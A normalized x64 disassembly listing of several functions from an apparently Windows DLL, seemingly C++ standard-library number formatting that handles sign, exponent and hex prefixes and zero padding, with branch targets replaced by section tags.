call j_sub_18002094c#2
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rdi
mov r8 [ rbp - 0x20 ]
inc r8
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_1800205e0
mov rcx [ rbp - 0x18 ]
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x18 ] rdi
jmp r-xdata
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rdi
mov r8 [ rbp - 0x20 ]
inc r8
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_1800205e0
mov rcx [ rbp - 0x18 ]
jmp r-xdata
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x18 ] rdi
jmp r-xdata
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x18 ] rdi
jmp r-xdata
sub_18000e550
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xc8
mov [ rbp - 0x59 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r15 r9
mov r14 r8
mov rbx rdx
mov [ rbp - 0x69 ] rdx
movzx r13d [ rbp + 0x77 ]
test [ r9 + 0x18 ] 0x4000
jne r-xdata
lea rdx [ rsp + 0x30 ]
mov rcx r9
call sub_18000b790
nop
mov rcx rax
call sub_18000dcf0
mov rsi rax
xor r12d r12d
mov rdi [ rsp + 0x30 ]
test rdi rdi
je r-xdata
movups xmm0 [ r8 ]
movaps [ rbp - 0x69 ] xmm0
mov r10 [ rcx ]
movzx edx [ rbp + 0x7f ]
mov [ rsp + 0x28 ] edx
mov [ rsp + 0x20 ] r13b
lea r8 [ rbp - 0x69 ]
mov rdx rbx
call [ r10 + 0x38 ]
jmp r-xdata
mov [ rbp - 0x39 ] 0xf
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] r12b
lea rdx [ rbp - 0x29 ]
mov rcx rsi
cmp [ rbp + 0x7f ] 0x0
je r-xdata
xor edx edx
lea rcx [ rbp - 0x79 ]
call sub_18001f9f0
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
mov rax rbx
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xc8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
call sub_18000d020
mov rbx rax
lea rax [ rbp - 0x51 ]
cmp rax rbx
je r-xdata
call sub_18000d040
mov rbx rax
lea rax [ rbp - 0x51 ]
cmp rax rbx
je r-xdata
mov rbx r12
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rbp - 0x79 ]
call sub_18001fa20
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
cmp [ rbp - 0x11 ] 0x10
jb r-xdata
cmp [ rbp - 0x39 ] 0x10
jb r-xdata
jmp r-xdata
cmp [ rbp - 0x39 ] 0x10
jb r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
mov rdi [ r15 + 0x28 ]
mov rbx [ rbp - 0x41 ]
test rdi rdi
jle r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_18002094c#2
mov [ rbp - 0x39 ] 0xf
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] 0x0
cmp [ rbx + 0x18 ] 0x10
jae r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_18002094c#2
mov [ rbp - 0x39 ] 0xf
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] 0x0
cmp [ rbx + 0x18 ] 0x10
jae r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_18002094c#2
mov rdi r12
cmp rdi rbx
jbe r-xdata
mov rax [ rbx ]
mov [ rbp - 0x51 ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
mov rdx rbx
lea rcx [ rbp - 0x51 ]
call sub_1800205e0
jmp r-xdata
mov rax [ rbx ]
mov [ rbp - 0x51 ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
mov rdx rbx
lea rcx [ rbp - 0x51 ]
call sub_1800205e0
jmp r-xdata
movups xmm0 [ r14 ]
movaps [ rsp + 0x30 ] xmm0
lea r12 [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x10
cmovae r12 [ rbp - 0x51 ]
test rbx rbx
je r-xdata
movups xmm0 [ r14 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
sub rdi rbx
jmp r-xdata
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x41 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x39 ] rax
mov [ rbx + 0x10 ] r12
mov [ rbx + 0x18 ] r12
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x41 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x39 ] rax
mov [ rbx + 0x10 ] r12
mov [ rbx + 0x18 ] r12
movups [ r14 ] xmm0
mov [ r15 + 0x28 ] 0x0
movups xmm0 [ r14 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
mov rsi [ rsp + 0x38 ]
movups [ r14 ] xmm0
mov rdi r12
mov rbx [ rsp + 0x38 ]
mov eax [ r15 + 0x18 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov rbx [ rbp - 0x69 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x39 ] 0x10
jb r-xdata
mov rbx [ rsp + 0x38 ]
nop
mov [ rsp + 0x30 ] 0x1
mov rax [ rsi + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_18002094c#2
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movzx r8d [ r12 ]
test rsi rsi
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx r8b
mov rax [ rsi ]
mov rcx rsi
call [ rax + 0x18 ]
mov rax [ rsi + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
mov rbx [ rbp - 0x41 ]
movaps xmm0 [ rsp + 0x30 ]
movzx edx r13b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx r13b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
inc r12
dec rbx
jne r-xdata
dec [ rax ]
mov rcx [ rsi + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r13b
movzx eax r13b
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r13b
movzx eax r13b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_18000e900
mov rax rsp
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x68 ]
sub rsp 0x130
mov [ rbp - 0x48 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
movaps [ rax - 0x48 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x10 ] rax
mov [ rbp - 0x80 ] r9
mov [ rsp + 0x58 ] r8
mov [ rbp - 0x60 ] rdx
mov [ rsp + 0x78 ] rcx
movzx r14d [ rbp + 0x90 ]
mov r15 [ rbp + 0x98 ]
mov [ rbp - 0x70 ] r15
mov rax [ rbp + 0xa0 ]
mov [ rsp + 0x60 ] rax
mov rax [ rbp + 0xa8 ]
mov [ rsp + 0x68 ] rax
mov r13 [ rbp + 0xb0 ]
mov r12 [ rbp + 0xb8 ]
lea rdx [ rbp - 0x58 ]
mov rcx r9
call sub_18000b790
nop
mov rcx rax
call sub_18000dcf0
mov rbx rax
mov [ rsp + 0x70 ] rax
mov esi 0x1
mov rdi [ rbp - 0x58 ]
test rdi rdi
je r-xdata
lea rdx [ rbp - 0x18 ]
mov rcx rbx
call sub_18000d410
nop
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x10 ]
mov [ rsp + 0x30 ] al
mov [ rbp - 0x28 ] 0xf
xor eax eax
mov [ rbp - 0x30 ] rax
mov [ rbp - 0x40 ] al
movzx ecx [ r15 ]
cmp cl 0x2b
je r-xdata
xor edx edx
lea rcx [ rbp - 0x78 ]
call sub_18001f9f0
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
movsxd r15 esi
call sub_180021604
mov rcx [ rax ]
movzx eax [ rcx ]
mov [ rsp + 0x50 ] al
mov [ rsp + 0x51 ] 0x65
mov r8 r12
mov edx 0x65
mov rsi [ rbp - 0x70 ]
mov rcx rsi
call sub_1800215e8
mov rdi rax
movsx edx [ rsp + 0x50 ]
mov r8 r12
mov rcx rsi
call sub_1800215e8
mov rbx rax
test rax rax
mov r9d 0x0
cmove r13 r9
lea rcx [ rbp - 0x18 ]
mov rdx [ rbp - 0x18 ]
mov r8 [ rbp ]
cmp r8 0x10
cmovae rcx rdx
cmp [ rcx ] 0x7f
je r-xdata
cmp cl 0x2d
je r-xdata
xor eax eax
mov ebx eax
cmp [ rdi + 0x8 ] rax
cmove rbx rdi
lea rcx [ rbp - 0x78 ]
call sub_18001fa20
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
lea rax [ r12 + r13 ]
add rax [ rsp + 0x68 ]
add rax [ rsp + 0x60 ]
mov rcx [ rbp - 0x80 ]
mov rdi [ rcx + 0x28 ]
test rdi rdi
jle r-xdata
lea rax [ rbp - 0x18 ]
cmp r8 0x10
cmovae rax rdx
cmp [ rax ] r9b
jle r-xdata
mov esi eax
mov rbx [ rsp + 0x70 ]
mov rax [ rbx ]
mov edx esi
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
mov rdi r9
cmp rdi rax
jbe r-xdata
mov r8 r12
mov rdx rsi
lea rcx [ rbp - 0x40 ]
call sub_18000d060
test rdi rdi
jne r-xdata
movsx edx [ rsp + 0x50 ]
mov r8 r12
mov rcx rsi
call sub_1800215e8
mov rsi rax
mov r15 [ rbp - 0x70 ]
test rax rax
je r-xdata
cmp eax 0x100
je r-xdata
sub rdi rax
jmp r-xdata
test rbx rbx
jne r-xdata
mov r8b 0x30
mov rdx r13
lea rcx [ rbp - 0x40 ]
call sub_18000d1a0
jmp r-xdata
mov r8 r12
mov edx 0x65
mov rcx r15
call sub_1800215e8
mov rsi rax
test rax rax
je r-xdata
sub rsi r15
inc rsi
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
lea rax [ rsi - 0x1 ]
movzx ecx [ rsp + 0x30 ]
mov [ rsp + 0x28 ] cl
mov [ rsp + 0x20 ] rax
mov r9 r15
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x70 ]
mov rcx [ rsp + 0x78 ]
call sub_18000d2a0
mov r11 rax
mov rax [ rax ]
mov [ rbx ] rax
mov rax [ r11 + 0x8 ]
mov [ rbx + 0x8 ] rax
movups xmm6 [ r11 ]
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
mov rax [ rsp + 0x60 ]
test rax rax
je r-xdata
test r15 r15
je r-xdata
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rdi rdi
je r-xdata
mov eax [ rcx + 0x18 ]
and eax 0x1c0
mov rbx [ rsp + 0x58 ]
cmp eax 0x40
je r-xdata
sub rdi rsi
mov r9b 0x30
mov r8 r13
mov rdx rdi
lea rcx [ rbp - 0x40 ]
call sub_18000cec0
mov r8b 0x30
mov rdx [ rsp + 0x60 ]
lea rcx [ rbp - 0x40 ]
call sub_18000d1a0
xor eax eax
mov [ rsp + 0x60 ] rax
lea rcx [ rbp - 0x40 ]
test rbx rbx
jne r-xdata
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] r12
mov r9 r15
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x58 ]
mov rcx [ rsp + 0x78 ]
call sub_18000d2a0
mov r11 rax
mov rax [ rax ]
mov [ rbx ] rax
mov rax [ r11 + 0x8 ]
mov [ rbx + 0x8 ] rax
movups xmm0 [ r11 ]
movaps [ rsp + 0x40 ] xmm0
test r13 r13
je r-xdata
sub rsi r15
inc rsi
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
lea rax [ rsi - 0x1 ]
movzx ecx [ rsp + 0x30 ]
mov [ rsp + 0x28 ] cl
mov [ rsp + 0x20 ] rax
mov r9 r15
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x58 ]
mov rcx [ rsp + 0x78 ]
call sub_18000d2a0
mov r11 rax
mov rax [ rax ]
mov [ rbx ] rax
mov rax [ r11 + 0x8 ]
mov [ rbx + 0x8 ] rax
movups xmm6 [ r11 ]
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
test r13 r13
je r-xdata
mov r8 [ rsp + 0x58 ]
movups [ r8 ] xmm6
movaps [ rsp + 0x40 ] xmm6
mov rcx [ rsp + 0x70 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
movzx r11d al
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rdi rdi
je r-xdata
movups xmm6 [ rbx ]
movaps [ rsp + 0x40 ] xmm6
movzx r8d [ rsi ]
mov rcx [ rsp + 0x48 ]
test rcx rcx
je r-xdata
movups [ rbx ] xmm0
xor eax eax
mov edi eax
jmp r-xdata
mov rbx [ rsp + 0x48 ]
sub rbx rsi
lea rdx [ rbx + 0x1 ]
mov r9b 0x30
mov r8 [ rsp + 0x68 ]
call sub_18000cec0
mov r9b 0x30
mov r8 [ rsp + 0x60 ]
mov rdx rbx
lea rcx [ rbp - 0x40 ]
call sub_18000cec0
xor r13d r13d
mov [ rsp + 0x68 ] r13
mov r8b 0x30
mov rdx [ rsp + 0x60 ]
call sub_18000d1a0
xor r13d r13d
jmp r-xdata
movups [ rbx ] xmm0
mov rax [ rbp - 0x80 ]
xor esi esi
mov [ rax + 0x28 ] rsi
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x48 ]
nop [ rax + rax ] ax
mov r8 [ rsp + 0x58 ]
movups [ r8 ] xmm6
xor eax eax
mov r13d eax
movaps [ rsp + 0x40 ] xmm6
mov rax [ rbp - 0x80 ]
test [ rax + 0x18 ] 0x4
lea rcx [ r--data ]
lea rax [ r--data ]
cmovne rax rcx
movzx r8d [ rax ]
test rbx rbx
je r-xdata
nop [ rax + rax ] eax
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
jmp r-xdata
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rbx [ rsp + 0x48 ]
nop [ rax ] eax
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
lea rsi [ rbp - 0x40 ]
cmp r8 0x10
cmovae rsi [ rbp - 0x40 ]
mov [ rbp - 0x70 ] rsi
xor r9d r9d
test cl cl
jle r-xdata
mov [ rsp + 0x60 ] r13
lea rdi [ rbp - 0x18 ]
cmp [ rbp ] 0x10
cmovae rdi [ rbp - 0x18 ]
lea rcx [ rbp - 0x40 ]
cmp [ rbp - 0x28 ] 0x10
cmovae rcx [ rbp - 0x40 ]
lea rdx [ rsp + 0x50 ]
call sub_18002163c
mov rsi rax
movzx ecx [ rdi ]
mov r8 [ rbp - 0x28 ]
mov r12 [ rbp - 0x30 ]
cmp cl 0x7f
je r-xdata
mov rbx [ rbp - 0x60 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x28 ] 0x10
jb r-xdata
mov rbx [ rsp + 0x48 ]
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] r13
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movups [ rbx ] xmm6
add r15 rsi
sub r12 rsi
mov rbx [ rsp + 0x48 ]
movzx edx r11b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
dec rax
mov [ rsp + 0x60 ] rax
jne r-xdata
mov rax [ rbx ]
mov edx 0x30
mov rcx rbx
call [ rax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movzx edx r8b
mov rax [ rcx ]
call [ rax + 0x18 ]
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov rbx [ rsp + 0x58 ]
movzx edx r14b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movsx rdx cl
mov rax rsi
sub rax r15
cmp rdx rax
jae r-xdata
mov [ rbp - 0x28 ] 0xf
mov [ rbp - 0x30 ] rsi
mov [ rbp - 0x40 ] 0x0
cmp [ rbp ] 0x10
jb r-xdata
mov rcx [ rbp - 0x40 ]
call j_sub_18002094c#2
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] rsi
je r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov rbx [ rsp + 0x58 ]
mov rax [ rbx ]
mov edx 0x30
mov rcx rbx
call [ rax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movzx edx r8b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] r13d
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rbx ]
mov edx 0x30
mov rcx rbx
call [ rax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsp + 0x40 ] 0x1
jmp r-xdata
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rbx [ rsp + 0x58 ]
movups [ rbx ] xmm6
movaps [ rsp + 0x40 ] xmm6
mov rax [ rsp + 0x68 ]
test rax rax
je r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r11b
movzx eax r11b
jmp r-xdata
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rsp + 0x60 ]
mov rax [ rsp + 0x60 ]
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] 0x30
jmp r-xdata
test rbx rbx
je r-xdata
jmp r-xdata
movzx edx r14b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movups [ rbx ] xmm6
inc rsi
mov [ rbp - 0x70 ] rsi
dec r12
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r14b
movzx eax r14b
jmp r-xdata
sub rsi rdx
cmp r12 rsi
jb r-xdata
mov rax rbx
mov rcx [ rbp + 0x10 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x170 ]
movaps xmm6 [ rsp + 0x120 ]
add rsp 0x130
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbp - 0x18 ]
call j_sub_18002094c#2
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
movzx edx r14b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] esi
jle r-xdata
dec r13
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] 0x30
jmp r-xdata
mov rbx [ rsp + 0x58 ]
movups [ rbx ] xmm6
add r15 rsi
sub r12 rsi
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
dec r13
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] 0x30
jmp r-xdata
dec rax
mov [ rsp + 0x68 ] rax
jne r-xdata
mov rax [ rbx ]
mov edx 0x30
mov rcx rbx
call [ rax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp eax 0xffffffff
jne r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r14b
movzx eax r14b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
lea rcx [ r--data ]
call sub_18001f714
or rax 0xffffffffffffffff
sub rax r12
cmp rax 0x1
jbe r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r14b
movzx eax r14b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
mov rbx [ rsp + 0x58 ]
mov rax [ rsp + 0x68 ]
mov rax [ rsp + 0x68 ]
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] 0x30
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
lea rbx [ r12 + 0x1 ]
cmp rbx 0xfffffffffffffffe
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
cmp r8 rbx
jae r-xdata
test rbx rbx
jne r-xdata
mov r8 r12
mov rdx rbx
lea rcx [ rbp - 0x40 ]
call sub_180007580
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x30 ] r13
lea rax [ rbp - 0x40 ]
cmp r8 0x10
cmovae rax [ rbp - 0x40 ]
mov [ rax ] bl
mov r12 [ rbp - 0x30 ]
mov r8 [ rbp - 0x28 ]
test rbx rbx
lea rax [ rdi + 0x1 ]
cmp [ rax ] 0x0
cmovg rdi rax
movzx ecx [ rdi ]
cmp cl 0x7f
jne r-xdata
lea rdx [ rbp - 0x40 ]
mov rax [ rbp - 0x40 ]
cmp r8 0x10
cmovae rdx rax
lea rcx [ rbp - 0x40 ]
cmovae rcx rax
sub r12 rsi
add rdx rsi
lea rcx [ rcx + rsi + 0x1 ]
mov r8 r12
call sub_1800205e0
lea r11 [ rbp - 0x40 ]
cmp [ rbp - 0x28 ] 0x10
cmovae r11 [ rbp - 0x40 ]
mov [ r11 + rsi ] 0x0
mov [ rbp - 0x30 ] rbx
lea rax [ rbp - 0x40 ]
cmp [ rbp - 0x28 ] 0x10
cmovae rax [ rbp - 0x40 ]
mov [ rax + rbx ] 0x0
mov r8 [ rbp - 0x28 ]
mov r12 [ rbp - 0x30 ]
jmp r-xdata
sub_18000f310
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xd0
mov [ rbp - 0x31 ] 0xfffffffffffffffe
mov [ rsp + 0x110 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov [ rbp - 0x61 ] r9
mov [ rsp + 0x40 ] r8
mov [ rbp - 0x49 ] rdx
mov [ rbp - 0x59 ] rcx
movzx esi [ rbp + 0x6f ]
mov r13 [ rbp + 0x77 ]
mov [ rbp - 0x71 ] r13
mov r15 [ rbp + 0x7f ]
lea rdx [ rbp - 0x51 ]
mov rcx r9
call sub_18000b790
nop
mov rcx rax
call sub_18000dcf0
mov r14 rax
mov [ rbp - 0x41 ] rax
mov r12d 0x1
mov rdi [ rbp - 0x51 ]
test rdi rdi
je r-xdata
lea rdx [ rbp - 0x29 ]
mov rcx r14
call sub_18000d410
nop
movzx eax [ r13 ]
cmp al 0x2b
je r-xdata
xor edx edx
lea rcx [ rbp - 0x79 ]
call sub_18001f9f0
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
movsxd r14 r12d
lea rax [ rbp - 0x29 ]
mov rcx [ rbp - 0x29 ]
mov rdx [ rbp - 0x11 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x7f
je r-xdata
cmp al 0x2d
je r-xdata
xor ebx ebx
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rbp - 0x79 ]
call sub_18001fa20
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rbp - 0x61 ]
mov rdi [ rax + 0x28 ]
test rdi rdi
jle r-xdata
lea rax [ rbp - 0x29 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x0
jle r-xdata
cmp al 0x30
jne r-xdata
mov rax [ rbx ]
mov edx r12d
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
xor edi edi
cmp rdi r15
jbe r-xdata
lea r12 [ rbp - 0x29 ]
cmp rdx 0x10
cmovae r12 rcx
mov rdi r15
movzx eax [ r12 ]
cmp al 0x7f
je r-xdata
xor r12d r12d
movzx eax [ r13 + 0x1 ]
cmp al 0x78
je r-xdata
mov r12 [ rsp + 0x40 ]
cmp eax 0x100
je r-xdata
sub rdi r15
jmp r-xdata
test al al
jle r-xdata
mov r12d 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov rbx [ rbp - 0x49 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x11 ] 0x10
jb r-xdata
mov rbx [ rsp + 0x38 ]
mov rax [ rsp + 0x40 ]
movups xmm0 [ rax ]
movaps [ rsp + 0x30 ] xmm0
mov r13 r14
mov r12 [ rbp - 0x71 ]
test r14 r14
je r-xdata
mov r12 [ rsp + 0x40 ]
movups xmm0 [ r12 ]
movaps [ rbp - 0x71 ] xmm0
test rdi rdi
je r-xdata
mov eax [ rax + 0x18 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
movsx rcx al
mov rax rdi
sub rax r14
cmp rcx rax
jae r-xdata
mov rax rbx
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x110 ]
add rsp 0xd0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbp - 0x29 ]
call j_sub_18002094c#2
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov r12 [ rsp + 0x40 ]
movups [ r12 ] xmm0
mov r13 [ rbp - 0x71 ]
add r13 r14
sub r15 r14
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x38 ]
movups [ r12 ] xmm0
xor edi edi
jmp r-xdata
